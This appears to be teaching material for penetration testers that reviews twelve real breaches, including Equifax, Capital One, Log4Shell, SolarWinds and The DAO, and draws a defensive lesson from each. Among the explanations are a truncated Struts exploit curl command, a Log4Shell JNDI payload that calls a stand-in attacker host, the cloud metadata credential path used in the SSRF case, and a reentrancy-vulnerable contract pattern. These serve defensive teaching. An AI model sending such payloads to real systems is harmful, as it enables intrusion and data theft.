🎯 Case Study 1 — Equifax (Apache Struts 2017)

📍 What Happened

In 2017, credit-reporting giant Equifax disclosed a breach that exposed 147 MILLION Americans' PII (names, SSNs, DOBs, addresses, driver's licenses, credit card numbers).

The Vulnerability

An unpatched Apache Struts 2 vulnerability (CVE-2017-5638). The flaw allowed remote code execution via a single malicious Content-Type header.

# Original exploit (a single HTTP request):
$ curl -X POST -H "Content-Type: %{(#_='multipart/form-data').(OGNL...)}" \
     -d "..."  http://equifax.com/path

# Equifax had been notified by HHS, DHS, the Apache Foundation, and their
# own internal scanner — but the patch was not applied in their
# dispute portal web app for 2 months.

Damage

  • $700M in settlement (FTC + state AGs)
  • Plummeting stock price
  • CEO, CIO, CISO resigned
  • Ongoing class-action suits & multiplied cost >$1.5B

Lesson for VAPT

  • Vulnerability scanners ≠ patching. Equifax ran the same scanner that flagged the issue. They had a 2-month patch cycle.
  • Frameworks ship CVEs — every Java/.NET/PHP app needs CVE monitoring.
  • Failure patch is not a tech issue—it's a process issue (patch SLA).
  • Asset inventory must include web app dependencies.

What a Pentester Would Have Caught

  • Nessus / Qualys scan flags Apache Struts 2.5.10 vulnerability
  • Burp Active Scan flags reflected payload
  • DAST check on Struts RCE
  • Manual test would have exploited in < 5 minutes

🎯 Case Study 2 — Capital One (SSRF, 2019)

📍 What Happened

A former AWS employee exploited a Server-Side Request Forgery vulnerability in Capital One's WAF (hosted on EC2). She used the EC2 metadata service to retrieve temporary IAM credentials. The WAF's over-permissive IAM role granted access to S3 buckets containing 106M credit applications.

The Exploit Chain

ATTACKER WAF EC2 AWS IAM │ │ │ │ injects SSRF URL │ │ ├───────────────────► │ │ │ 169.254.169.254/ │ │ │ latest/meta-data/ │ │ │ iam/credentials │ │ │ │ requests creds │ │ ├───────────────────►│ │ │ returns AWS creds │ │ │◄──────────────────┤ │ │ │ │ returns creds to attacker │ │ ◄───────────────────┤ │ │ │ │ │ uses creds to dump S3 │ ├────────────────────────────────────────┐ │ ▼ S3 Buckets (Capital One customer data) — 106M records

Damage

  • $190M settlement
  • Conviction of the attacker
  • Reputational damage in financial services industry

Root Cause

  1. SSRF in WAF application — allowed attacker-supplied URL fetch
  2. Over-broad IAM policy — WAF role could read whole S3 bucket
  3. No network egress restrictions on WAF EC2

Lesson / VAPT Takeaway

  • Test SSRF in every web app with URL input fields
  • IMDSv2 is the AWS answer — enforce it
  • Least-privilege IAM is the cardinal cloud rule
  • Network egress restrictions prevent lateral movement

🎯 Case Study 3 — Marriott (Starwood Supply-Chain Breach)

📍 What Happened

Marriott International disclosed in 2018 that attackers had been inside their Starwood Hotels reservation system since 2014 — 4 years before discovery. 339 million guest records were exposed, including passport numbers, payment cards, and travel data.

The Root Cause

Starwood's reservation system was compromised before Marriott even acquired it in 2016. The attackers were inside before any of Marriott's own controls.

VAPT Lessons

  • Acquisition due diligence must include cyber audit. Marriott's $13B Starwood acquisition ignored cyber hygiene.
  • Legacy system integration is a high-risk phase — many breaches start there.
  • Logging was insufficient to detect 4 years of attacker presence.
  • VAPT post-acquisition is essential.

Damage

  • £18.4M fine by UK ICO
  • Multiple class-action settlements >$200M

🎯 Case Study 4 — SolarWinds SUNBURST (2020)

📍 State-Sponsored Supply-Chain Attack

Russian SVR (APT29 / "Cozy Bear") compromised SolarWinds' build server and trojanized the Orion software update. ~18,000 SolarWinds customers received malicious updates, including:

  • U.S. Treasury Department
  • U.S. Department of Homeland Security
  • U.S. State Department
  • Microsoft
  • FireEye (the cybersecurity firm that discovered it!)
  • ~100 of Fortune 500

Vulnerability Constant

  • No signature verification on updates
  • Build server compromise → all downstream tainted
  • Stolen signing certificate allowed authentic malicious updates
  • Long dwell time (~14 months before discovery)

VAPT Lessons

  • SBOM (Software Bill of Materials) would have revealed unexpected dependencies.
  • Update verification (signature checks) is essential.
  • Build pipeline must be isolated & monitored.
  • Anomalous outbound traffic from production should trigger SOC.

🎯 Case Study 5 — Log4Shell (Log4j, 2021)

📍 What Happened

CVE-2021-44228 — a single 9-line vulnerability in Apache Log4j (a Java logging library used in millions of apps) allowed Remote Code Execution via a single malicious user input that contained ${jndi:ldap://attacker.com/...}.

Scale

  • Estimated $30+ BILLION in remediation costs worldwide
  • AWS, Apple iCloud, Twitter, Tesla, VMware, IBM, and thousands of others affected
  • CVSS 10.0 (worst possible)

Detection

# Single payload that triggers all Log4j versions:
$ curl -H 'User-Agent: ${jndi:ldap://attacker.com/x}' \
       https://target.com
# If response comes back to attacker's LDAP server → vulnerable

# Mass-scan tools:
$ nuclei -t cves/2021/CVE-2021-44228.yaml -u target
$ log4j-scan target.com

VAPT Lesson

  • SBOM + dependency scanning would have logged affected apps.
  • 3rd-party libs are bank accounts — audit them monthly.
  • Automated patching pipelines (Dependabot / Renovate) prevent drift.

🎯 Case Study 6 — The DAO (Ethereum Reentrancy, 2016)

📍 What Happened

The DAO was a $150M Decentralized Autonomous Organization on Ethereum. A reentrancy bug allowed an attacker to drain 3.6 million ETH (~$50M at the time, much more later).

Vulnerable Code Pattern

function withdraw(uint amount) public {
    if (balances[msg.sender] >= amount) {
        // Send ETH BEFORE updating balances
        msg.sender.call.value(amount)();
        balances[msg.sender] -= amount;
    }
}

// Attacker's contract re-enters withdraw() before balance is updated.

VAPT Lesson

  • Smart contracts need formal verification + manual audit before deployment
  • Immutable code = immutable bugs. Pre-deployment audit is your only chance
  • Reentrancy guard (mutex) is the fix

Outcome

Ethereum hard-forked to reverse the hack — controversial split between core devs and led to creation of Ethereum Classic.

🎯 Case Study 7 — Mirai Botnet (2016)

📍 What Happened

A 21-year-old college student created Mirai, malware that scanned the internet, found IoT devices (cameras, routers, DVRs), and tried 60+ default username/password combinations. Once infected, devices became bots in a DDoS network.

The largest attack: 620 Gbps against Dyn DNS, taking down Twitter, Reddit, Netflix, GitHub, Airbnb and others for an entire day.

What Made It Possible

  • Default credentials never changed
  • Telnet enabled (port 23) by default
  • No anti-bruteforce on consumer devices
  • Vendor had no update mechanism

VAPT Lesson

  • IoT devices need to enforce strong default credentials
  • Default port 23 (telnet) should not exist on any device
  • Vendors should ship devices in "out-of-the-box secure" state
  • Network segmentation: IoT in its own VLAN

🎯 Case Study 8 — Twitter 2020 Internal Admin Hack

📍 What Happened

Three attackers (one a Twitter employee) social-engineered their way to internal Twitter admin tools. They hijacked high-profile accounts: Barack Obama, Joe Biden, Elon Musk, Bill Gates, Apple, Uber and ran a Bitcoin scam, collecting $120,000 in BTC before being detected.

Attack Vector

  • Vishing (phone social engineering) of Twitter staff
  • Internal admin tool gave any user ability to reset high-profile accounts

VAPT Lesson

  • Insider risk testing should be part of every engagement
  • MFA must be enforced for admin tools
  • Privileged Access Management (PAM) is essential
  • Social engineering is a real attack vector, not theoretical

🎯 Case Study 9 — Uber S3 Bucket (2016)

📍 What Happened

Uber developer accidentally published AWS credentials in a public GitHub repo. An attacker found them, dumped several S3 buckets, discovered a database backup containing 600,000 driver & customer records.

Vulnerable Practice

  • AWS keys committed to public GitHub repository
  • Keys had overly-broad S3 list & read permissions

VAPT Lesson

  • git-secrets should be installed on every dev machine & CI server
  • Pre-commit hooks prevent secret leaks
  • AWS/GCP IAM keys should be short-lived (STS / Workload Identity)
  • GitGuardian / TruffleHog tools scan public repos automatically

🎯 Case Study 10 — Microsoft AI Studio (Wiz, 2023)

📍 What Happened

Wiz Research discovered a misconfigured Azure AI Studio shared endpoint with 38TB of internal Microsoft data exposed — including training data, internal models, and customer information.

Root Cause

  • Azure ML Studio's URL preview feature made a shared token publicly accessible
  • Insufficient access controls on AI Studio
  • Not visible in Azure Portal — discovered only via external recon

VAPT Lesson

  • External recon of Azure blobs (storage account enumeration) is a must
  • Even cloud giants have misconfigurations
  • AI/LLM systems introduce new attack surfaces
  • Deny-by-default and continuous scanning should be mandatory

🎯 Case Study 11 — Verkada Cameras (2021)

📍 What Happened

Verkada, a $1.5B "smart office camera" company, had its admin panel hacked. Attackers accessed 150,000 cameras in hospitals, factories, prisons, schools, and even inside homes.

Attack Vector

  • Verkada engineer had a super-admin credentials
  • Credentials had been compromised via earlier breach (re-use)
  • Account had access to ALL cameras company-wide
  • Some cameras were in sensitive hospital rooms

VAPT Lesson

  • Privileged Access Management (PAM) is essential even for internal systems
  • No single human should have "root on all" access
  • Credential rotation is non-negotiable
  • Internal VAPT should test credential reuse from prior breaches

🎯 Case Study 12 — Pegasus Spyware (iOS)

📍 What Happened

NSO Group's Pegasus spyware infected iPhones and Androids of journalists, activists, politicians, and lawyers — including iOS devices on the freshest, fully patched iOS.

How It Worked

  • 0-click infections — no user interaction
  • Delivered via iMessage, WhatsApp, Apple Music links
  • Exploited unpatched iMessage parsing bugs
  • Chained to Kernel exploits for full device control
  • Self-destructed after use

VAPT Lesson

  • Mobile security testing must include dynamic analysis (Frida, MobSF)
  • Real attacker exploits are inter-disciplinary: browser + OS + kernel
  • For high-risk individuals (journalists, dissidents) — specialty devices like GrapheneOS, hardened iOS configs
  • Bug bounties alone don't catch state-sponsored threats

🧠 Meta-Lesson

Almost every major breach could have been prevented or detected earlier by professional VAPT. Yet breaches keep happening because:

  1. Organizations don't run VAPT often enough (annual, not quarterly)
  2. VAPT reports are filed but no remediation workflow exists
  3. Agile development deploys faster than security test cycles
  4. Security investments are cuts, not enablers, in board thinking
  5. Specialized testing (OT, LLM, supply chain) is ignored

Your career as a VAPT leader is in closing this gap.
